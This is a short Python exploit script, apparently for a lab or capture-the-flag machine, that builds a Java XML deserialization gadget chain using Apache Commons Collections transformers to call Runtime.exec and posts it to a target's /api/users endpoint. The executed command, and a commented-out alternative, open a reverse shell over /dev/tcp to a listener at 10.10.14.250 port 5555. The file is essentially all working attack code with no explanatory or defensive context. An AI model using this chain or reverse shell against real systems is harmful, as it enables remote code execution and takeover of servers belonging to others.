import requests

def build_xml_payload(command):
        command = command.replace("&", "&amp;")
        command = command.replace("<", "&lt;")
        command = command.replace(">", "&gt;")
        command = command.replace('"', "&quot;")
        command = command.replace("'", "&apos;")

        xml_data = f"""
        <sorted-set>
            <string>abcd</string>
            <dynamic-proxy>
                <interface>java.lang.Comparable</interface>
                <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
                    <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                        <iTransformers>
                            <org.apache.commons.collections4.functors.ConstantTransformer>
                                <iConstant class="java-class">java.lang.Runtime</iConstant>
                            </org.apache.commons.collections4.functors.ConstantTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>getMethod</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.String</java-class>
                                    <java-class>[Ljava.lang.Class;</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <string>getRuntime</string>
                                    <java-class-array/>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>invoke</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.Object</java-class>
                                    <java-class>[Ljava.lang.Object;</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <null/>
                                    <object-array/>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>exec</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.String</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <string>{command}</string>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                        </iTransformers>
                    </target>
                    <methodName>transform</methodName>
                    <eventTypes>
                        <string>compareTo</string>
                    </eventTypes>
                </handler>
            </dynamic-proxy>
        </sorted-set>
        """
        return xml_data

def exploit():
        target = f"https://10.129.3.236"
        HEADERS = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/xml",
        }
        # command = f"bash -i >& /dev/tcp/10.10.14.250/5555 0>&1"
        command = f"sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/10.10.14.250/5555;sh <&53 >&53 2>&53'"
        xml_payload = build_xml_payload(command)
        requests.post(f"{target}/api/users", headers=HEADERS, data=xml_payload, timeout=20, verify=False)

exploit()